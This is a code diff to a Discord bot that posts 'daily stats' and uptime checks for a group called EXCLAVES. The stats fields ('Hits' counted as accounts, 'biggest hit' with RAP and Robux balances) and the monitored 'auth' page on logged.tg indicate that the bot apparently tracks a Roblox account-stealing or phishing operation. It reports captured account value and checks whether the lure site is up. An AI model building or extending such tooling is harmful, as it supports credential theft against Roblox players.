@@ -34,7 +34,7 @@ function formatDuration(ms) {
 let lastUpTime = null;
 let lastStatus = null;
 const STATUS_CHANNEL_ID = "1437881455534674001";
-const MAIN_SITE_URL = "https://www.logged.tg/auth/exclaves";
+const MAIN_SITE_URL = "https://www.logged.tg/auth/execlaves";
 const MAIN_SITE_NAME = "EXECLAVES";
 
 // 5.1️⃣ Monitor site la fiecare 30 secunde
@@ -60,7 +60,7 @@ setInterval(async () => {
       const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
       if (channel) {
         const embed = new EmbedBuilder()
-          .setColor(0x800080) // Purple
+          .setColor(0x800080)
           .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
           .setDescription(
             `─── <a:breezy:1396413730757017692> **EXCLAVES STATUS** <a:breezy:1396413730757017692> ───\n\n` +
@@ -102,7 +102,7 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x800080) // Purple
+        .setColor(0x800080)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
         .setDescription(`─── <a:breezy:1396413730757017692> **EXCLAVES STATS** <a:breezy:1396413730757017692> ───
 
@@ -139,3 +139,80 @@ Robux: ${formatNumber(normal.Totals?.Balance)}
     try {
       const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=exclaves&userId=${targetId}`);
       const data = await res.json();
+      if (!data.success) return message.reply("❌ No daily stats available.");
+
+      const daily = data.Daily || data.Normal;
+      const profile = data.Profile || {};
+      const userName = profile.userName || targetUser.username;
+
+      const embed = new EmbedBuilder()
+        .setColor(0x800080)
+        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
+        .setDescription(`─── <a:breezy:1396413730757017692> **EXCLAVES DAILY** <a:breezy:1396413730757017692> ───
+
+<a:Animated_Arrow_Purple:1418940595782549636> **User:** **${userName}**
+
+<a:Animated_Arrow_Purple:1418940595782549636> **DAILY STATS:**
+Hits: ${formatNumber(daily.Totals?.Accounts)}
+Visits: ${formatNumber(daily.Totals?.Visits)}
+Clicks: ${formatNumber(daily.Totals?.Clicks)}
+
+<a:Animated_Arrow_Purple:1418940595782549636> **BIGGEST HIT:**
+Summary: ${formatNumber(daily.Highest?.Summary)}
+RAP: ${formatNumber(daily.Highest?.Rap)}
+Robux: ${formatNumber(daily.Highest?.Balance)}
+
+<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL HIT STATS:**
+Summary: ${formatNumber(daily.Totals?.Summary)}
+RAP: ${formatNumber(daily.Totals?.Rap)}
+Robux: ${formatNumber(daily.Totals?.Balance)}
+`)
+        .setImage("https://i.imgur.com/bnuEGXF.gif")
+        .setFooter({ text: "EXCLAVES Daily Stats" });
+
+      await message.channel.send({ embeds: [embed] });
+
+    } catch (err) {
+      console.error('Error fetching daily stats:', err);
+      message.reply("❌ Error fetching daily stats. Please try again later.");
+    }
+  }
+
+  // ===== !check =====
+  if (message.content.startsWith('!check')) {
+    try {
+      const start = Date.now();
+      let res, ping;
+      try { const response = await fetch(MAIN_SITE_URL); res = { ok: response.ok }; ping = Date.now() - start; } 
+      catch { res = { ok: false }; ping = null; }
+
+      let statusText = res.ok ? "<a:Animated_Arrow_Purple:1418940595782549636> ONLINE" : "<a:Animated_Arrow_Purple:1418940595782549636> OFFLINE";
+      let uptimeText = res.ok && lastUpTime ? `UP for ${formatDuration(Date.now() - lastUpTime)}` : "❌ No uptime data";
+
+      const embed = new EmbedBuilder()
+        .setColor(0x800080)
+        .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
+        .setDescription(`─── <a:breezy:1396413730757017692> **EXCLAVES STATUS** <a:breezy:1396413730757017692> ───\n\n` +
+          `<a:Animated_Arrow_Purple:1418940595782549636> **${MAIN_SITE_NAME}**\n` +
+          `<a:Animated_Arrow_Purple:1418940595782549636> STATUS: ${statusText}\n` +
+          `<a:Animated_Arrow_Purple:1418940595782549636> UPTIME: ${uptimeText}\n` +
+          `<a:Animated_Arrow_Purple:1418940595782549636> Response Time: ${ping ? ping + "ms" : "N/A"}`
+        )
+        .setImage("https://i.imgur.com/bnuEGXF.gif")
+        .setFooter({ text: "EXCLAVES Site Monitor" });
+
+      await message.channel.send({ embeds: [embed] });
+
+    } catch (err) {
+      console.error(err);
+    }
+  }
+
+});
+
+// 7️⃣ Error handler
+client.on('error', (error) => console.error('Discord client error:', error));
+
+// 8️⃣ Login bot
+if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
+client.login(TOKEN);
